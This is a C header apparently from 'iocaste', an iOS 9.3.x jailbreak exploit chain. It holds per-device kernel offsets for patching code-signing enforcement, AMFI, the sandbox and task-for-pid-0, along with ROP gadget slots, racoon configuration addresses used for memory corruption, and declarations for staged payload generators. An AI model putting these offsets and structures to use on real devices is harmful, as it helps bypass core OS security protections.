#ifndef iocaste_h
#define iocaste_h

#include "common.h"
#include "dyld_cache.h"

#define init_koffsets(_model, v1, v2, v3, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16) \
    {.model = _model, .version = {v1, v2, v3}, .i_can_has_kernel_configuration_got = a1, .lwvm_jump = a2, \
    .proc_enforce = a3, .cs_enforcement_disable = a4, .PE_i_can_has_debugger_1 = a5, .PE_i_can_has_debugger_2 = a6, .p_bootargs = a7, \
    .vm_fault_enter = a8, .vm_map_enter = a9, .vm_map_protect = a10, .mount_patch = a11, .sb_call_i_can_has_debugger = a12, .csops = a13, \
    .amfi_file_check_mmap = a14, .sbops = a15, .tfp0_patch = a16}

typedef struct {
    const char *model;
    uint32_t version[3];
    uint32_t i_can_has_kernel_configuration_got;
    uint32_t lwvm_jump;
    uint32_t proc_enforce;
    uint32_t cs_enforcement_disable;
    uint32_t PE_i_can_has_debugger_1;
    uint32_t PE_i_can_has_debugger_2;
    uint32_t p_bootargs;
    uint32_t vm_fault_enter;
    uint32_t vm_map_enter;
    uint32_t vm_map_protect;
    uint32_t mount_patch;
    uint32_t sb_call_i_can_has_debugger;
    uint32_t csops;
    uint32_t amfi_file_check_mmap;
    uint32_t sbops;
    uint32_t tfp0_patch;
} kernel_offsets_t;

static const kernel_offsets_t global_kernel_offsets[25] = {
    init_koffsets("iPad2,1", 9,3,5, 0x809cd04c, 0x809c4727, 0x80404124, 0x80780bf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80eba748, 0x802c2b42, 0x8076489a, 0x80f2e338, 0x802fded8),
    init_koffsets("iPad2,2", 9,3,5, 0x809cd04c, 0x809c4727, 0x80404124, 0x80780bf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80f17748, 0x802c2b42, 0x8076489a, 0x80f8b338, 0x802fded8),
    init_koffsets("iPad2,3", 9,3,5, 0x809cd04c, 0x809c4727, 0x80404124, 0x80780bf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80f16748, 0x802c2b42, 0x8076489a, 0x80f8a338, 0x802fded8),
    init_koffsets("iPad2,3", 9,3,6, 0x809cc04c, 0x809c3727, 0x80404124, 0x8077fbf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80f15748, 0x802c2b42, 0x8076455e, 0x80f89338, 0x802fded8),
    init_koffsets("iPad2,4", 9,3,5, 0x809cd04c, 0x809c4727, 0x80404124, 0x80780bf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80e8e748, 0x802c2b42, 0x8076489a, 0x80f02338, 0x802fded8),
    init_koffsets("iPad2,5", 9,3,5, 0x80c5204c, 0x80c49727, 0x80404124, 0x80780bf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80ed7748, 0x802c2b42, 0x8076489a, 0x80f4b338, 0x802fded8),
    init_koffsets("iPad2,6", 9,3,5, 0x80c5804c, 0x80c4f727, 0x80404124, 0x80780bf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80f01748, 0x802c2b42, 0x8076489a, 0x80f75338, 0x802fded8),
    init_koffsets("iPad2,6", 9,3,6, 0x80c5704c, 0x80c4e727, 0x80404124, 0x8077fbf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80f00748, 0x802c2b42, 0x8076455e, 0x80f74338, 0x802fded8),
    init_koffsets("iPad2,7", 9,3,5, 0x80c5804c, 0x80c4f727, 0x80404124, 0x80780bf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80f01748, 0x802c2b42, 0x8076489a, 0x80f75338, 0x802fded8),
    init_koffsets("iPad2,7", 9,3,6, 0x80c5704c, 0x80c4e727, 0x80404124, 0x8077fbf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80f00748, 0x802c2b42, 0x8076455e, 0x80f74338, 0x802fded8),
    init_koffsets("iPad3,1", 9,3,5, 0x80bfd04c, 0x80bf4727, 0x80404124, 0x80780bf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80f0d748, 0x802c2b42, 0x8076489a, 0x80f81338, 0x802fded8),
    init_koffsets("iPad3,2", 9,3,5, 0x80c0304c, 0x80bfa727, 0x80404124, 0x80780bf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80f35748, 0x802c2b42, 0x8076489a, 0x80fa9338, 0x802fded8),
    init_koffsets("iPad3,2", 9,3,6, 0x80c0204c, 0x80bf9727, 0x80404124, 0x8077fbf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80f34748, 0x802c2b42, 0x8076455e, 0x80fa8338, 0x802fded8),
    init_koffsets("iPad3,3", 9,3,5, 0x80c0304c, 0x80bfa727, 0x80404124, 0x80780bf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80f35748, 0x802c2b42, 0x8076489a, 0x80fa9338, 0x802fded8),
    init_koffsets("iPad3,3", 9,3,6, 0x80c0204c, 0x80bf9727, 0x80404124, 0x8077fbf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80f34748, 0x802c2b42, 0x8076455e, 0x80fa8338, 0x802fded8),
    init_koffsets("iPhone4,1", 9,3,5, 0x80b9a04c, 0x80b91727, 0x80404124, 0x80780bf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80f1d748, 0x802c2b42, 0x8076489a, 0x80f91338, 0x802fded8),
    init_koffsets("iPhone4,1", 9,3,6, 0x80b9904c, 0x80b90727, 0x80404124, 0x8077fbf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80f1c748, 0x802c2b42, 0x8076455e, 0x80f90338, 0x802fded8),
    init_koffsets("iPod5,1", 9,3,5, 0x80c5204c, 0x80c49727, 0x80404124, 0x80780bf1, 0x803a92c4, 0x80457070, 0x8045b5b0, 0x80076f1e, 0x8007e234, 0x8007faa4, 0x800f1381, 0x80ef6748, 0x802c2b42, 0x8076489a, 0x80f6a338, 0x802fded8),
    init_koffsets("iPhone5,1", 9,3,5, 0x80c1a04c, 0x80c11a17, 0x8040c124, 0x80792bf1, 0x803b0ee4, 0x8045f1a0, 0x804637a0, 0x80079272, 0x80080658, 0x80081ffc, 0x800f686f, 0x80ea0738, 0x802c8b26, 0x80775a8e, 0x80f14338, 0x80303fec),
    init_koffsets("iPhone5,2", 9,3,5, 0x80c1a04c, 0x80c11a17, 0x8040c124, 0x80792bf1, 0x803b0ee4, 0x8045f1a0, 0x804637a0, 0x80079272, 0x80080658, 0x80081ffc, 0x800f686f, 0x80ea0738, 0x802c8b26, 0x80775a8e, 0x80f14338, 0x80303fec),
    init_koffsets("iPhone5,3", 9,3,5, 0x80c6104c, 0x80c58a17, 0x8040c124, 0x80792bf1, 0x803b0ee4, 0x8045f1a0, 0x804637a0, 0x80079272, 0x80080658, 0x80081ffc, 0x800f686f, 0x80eb1738, 0x802c8b26, 0x80775a8e, 0x80f25338, 0x80303fec),
    init_koffsets("iPhone5,4", 9,3,5, 0x80c6104c, 0x80c58a17, 0x8040c124, 0x80792bf1, 0x803b0ee4, 0x8045f1a0, 0x804637a0, 0x80079272, 0x80080658, 0x80081ffc, 0x800f686f, 0x80eb1738, 0x802c8b26, 0x80775a8e, 0x80f25338, 0x80303fec),
    init_koffsets("iPad3,4", 9,3,5, 0x80c8d04c, 0x80c84a17, 0x8040c124, 0x80792bf1, 0x803b0ee4, 0x8045f1a0, 0x804637a0, 0x80079272, 0x80080658, 0x80081ffc, 0x800f686f, 0x80e9a738, 0x802c8b26, 0x80775a8e, 0x80f0e338, 0x80303fec),
    init_koffsets("iPad3,5", 9,3,5, 0x80c9304c, 0x80c8aa17, 0x8040c124, 0x80792bf1, 0x803b0ee4, 0x8045f1a0, 0x804637a0, 0x80079272, 0x80080658, 0x80081ffc, 0x800f686f, 0x80ec4738, 0x802c8b26, 0x80775a8e, 0x80f38338, 0x80303fec),
    init_koffsets("iPad3,6", 9,3,5, 0x80c9304c, 0x80c8aa17, 0x8040c124, 0x80792bf1, 0x803b0ee4, 0x8045f1a0, 0x804637a0, 0x80079272, 0x80080658, 0x80081ffc, 0x800f686f, 0x80ec4738, 0x802c8b26, 0x80775a8e, 0x80f38338, 0x80303fec)
};

typedef struct {
    struct {
        uint32_t pop_r4_r7_pc;
        uint32_t pop_r0_r1_r2_r3_r4_pc;
        uint32_t pop_r4_r5_r6_r7_pc;
        uint32_t ldr_r1_r2_mov_r2_r9_bx_r3;
        uint32_t svc_0x80_bx_lr;
        uint32_t str_r0_r3_bx_lr;
        uint32_t pop_r2_r3_r7_pc;
        uint32_t ldr_r0_r2_bx_lr;
        uint32_t add_r0_r2_bx_lr;
        uint32_t str_r0_r2_bx_lr;
        uint32_t str_r2_r3_bx_lr;
        uint32_t add_r0_r1_bx_lr;
        uint32_t pop_r0_r1_pc;
        uint32_t str_r0_r1_bx_lr;
        uint32_t pop_r12_pc;
        uint32_t pop_lr_pc;
        uint32_t rop_start;
        struct {
            uint32_t version;
            uint32_t gadget1;
            uint32_t gadget2;
            uint32_t gadget3;
            uint32_t gadget4;
            uint32_t gadget5;
            uint32_t orig_lr;
        } syscall;
    } gadgets;

    struct {
        uint32_t dlopen;
        uint32_t longjump;
        uint32_t syscall;
        uint32_t strlcpy;
        uint32_t strlcpy_lazy_ptr;
        uint32_t JSGlobalContextCreate;
        uint32_t JSContextGetGlobalObject;
        uint32_t JSStringCreateWithUTF8CString;
        uint32_t JSObjectMakeFunctionWithCallback;
        uint32_t JSObjectSetProperty;
        uint32_t JSObjectGetProperty;
        uint32_t JSValueToObject;
        uint32_t JSValueMakeNumber;
        uint32_t JSObjectCallAsConstructor;
        uint32_t JSObjectMakeArray;
        uint32_t JSEvaluateScript;
    } symbols;

    struct {
        struct {
            uint32_t isakmp_cfg_addr;
            uint32_t lcconf_addr;
            uint32_t dns4_arr;
            uint32_t lcconf_counter;
            int32_t dns4_to_lcconf;
        } racoon;
        struct {
            uint32_t array_buffer;
            uint32_t byte_length;
            uint32_t mode;
        } data_view;
        struct {
            uint32_t file_size;
            uint32_t file_offset;
            uint32_t signature_size;
        } csblob;
        struct {
            uint32_t i_can_has_kernel_configuration_got;
            uint32_t lwvm_jump;
            uint32_t proc_enforce;
            uint32_t cs_enforcement_disable;
            uint32_t PE_i_can_has_debugger_1;
            uint32_t PE_i_can_has_debugger_2;
            uint32_t p_bootargs;
            uint32_t vm_fault_enter;
            uint32_t vm_map_enter;
            uint32_t vm_map_protect;
            uint32_t mount_patch;
            uint32_t sb_call_i_can_has_debugger;
            uint32_t csops;
            uint32_t amfi_file_check_mmap;
            uint32_t sbops;
            uint32_t tfp0_patch;
        } kernel;
    } offsets;

    struct {
        uint32_t stack_base;
    } stage1;

    struct {
        uint32_t stack_base;
        uint32_t stack_varibles;
        uint32_t stack_strings;
        uint32_t stack_size;
    } stage2;

    struct {
        uint32_t mapping_base;
        uint32_t mapping_size;
    } stage3;

    struct {
        uint32_t max_slide;
        uint32_t region_base;
        uint32_t region_size;
        uint32_t remap_base;
        uint32_t remap_size;
        dsc_info_t *info;
    } dsc;
} iocaste_ctx_t;

extern iocaste_ctx_t *iocaste;

void iocaste_deinit(void);
int iocaste_init(void);
int iocaste_create_backup(void);
int iocaste_restore_backup(void);

int gen_stage1(void);
int gen_stage2(void);
int gen_stage3(void);

#endif /* iocaste_h */
